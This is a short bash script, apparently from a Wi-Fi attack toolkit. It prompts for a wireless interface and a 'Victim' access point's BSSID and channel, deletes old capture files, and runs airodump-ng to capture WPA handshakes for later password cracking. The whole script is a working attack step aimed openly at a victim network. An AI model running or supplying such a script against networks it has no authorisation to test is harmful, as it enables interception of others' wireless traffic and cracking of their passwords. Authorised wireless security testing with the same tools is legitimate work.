#! /../bin/bash

clear
echo -e "Enter Interface Name"
read INT
clear
echo -e "Enter the BSSID of Victim"
read BSID
clear
echo -e "Enter the channel of Victim"
read CH
clear
rm /../root/Dlon/handshakes/hand-01.cap
rm /../root/Dlon/handshakes/hand-01.csv
rm /../root/Dlon/handshakes/hand-01.kismet.csv
rm /../root/Dlon/handshakes/hand-01.kismet.netxml
airodump-ng --bssid $BSID -c $CH --write /../root/Dlon/handshakes/hand $INT

